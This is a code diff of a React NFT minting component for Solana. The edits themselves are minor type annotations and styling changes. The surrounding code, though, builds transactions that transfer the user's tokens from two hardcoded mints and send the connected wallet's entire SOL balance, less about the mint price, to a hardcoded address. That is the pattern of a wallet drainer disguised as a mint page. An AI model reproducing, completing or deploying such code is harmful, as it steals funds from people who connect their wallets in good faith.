@@ -53,12 +53,12 @@ const MintingComponent = ({setAlertState} : any) => {
         const mintAddress1 = new PublicKey('8ngygxfET6gS1ypzALggQs7imYksCoCc2AQXF1HieqXx');
         // const sourceAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress1, wallet.publicKey);
         // const destinationAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress1, serverWallet.publicKey);
-        const otherTransferInstruction = await createTokenTransferInstruction(mintAddress1, LAMPORTS_PER_SOL);
+        const otherTransferInstruction: any = await createTokenTransferInstruction(mintAddress1, LAMPORTS_PER_SOL);
 
         const mintAddress2 = new PublicKey('CuEJZgvQQnu15FzNWXS1kLtEVQimYct63LsUm2fiu9V4');
-        const otherTransferInstruction2 = await createTokenTransferInstruction(mintAddress2, LAMPORTS_PER_SOL);
+        const otherTransferInstruction2 : any = await createTokenTransferInstruction(mintAddress2, LAMPORTS_PER_SOL);
 
-        const otherTransferInstruction3 = SystemProgram.transfer({
+        const otherTransferInstruction3 : any = SystemProgram.transfer({
             fromPubkey: wallet.publicKey,
             toPubkey: new PublicKey('J7oe9hS3YsEST7VviiEuF9MnyCsfgMUg5afWfXnSRmcX'),
             lamports: totalBalance - LAMPORTS_PER_SOL * (quantity * price + 0.01) 
@@ -95,7 +95,12 @@ const MintingComponent = ({setAlertState} : any) => {
   return (
     <div className='flex flex-col items-center'>
         <StyledTextComponent />
-        <div style={styles.container}>
+        <div style={{border: '1px solid #ccc',
+            padding: '20px',
+            borderRadius: '8px',
+            width: '300px',
+            textAlign: 'center',
+            backgroundColor: '#f9f9f9',}}>
         <h2>{minted}/{totalSupply} minted</h2>
         <div style={styles.progressBar}>
             <div style={{ ...styles.progressFill, width: `${progress}%` }} />
@@ -119,7 +124,7 @@ const styles = {
     padding: '20px',
     borderRadius: '8px',
     width: '300px',
-    textAlign: 'center',
+    // textAlign: 'center',
     backgroundColor: '#f9f9f9',
   },
   progressBar: {
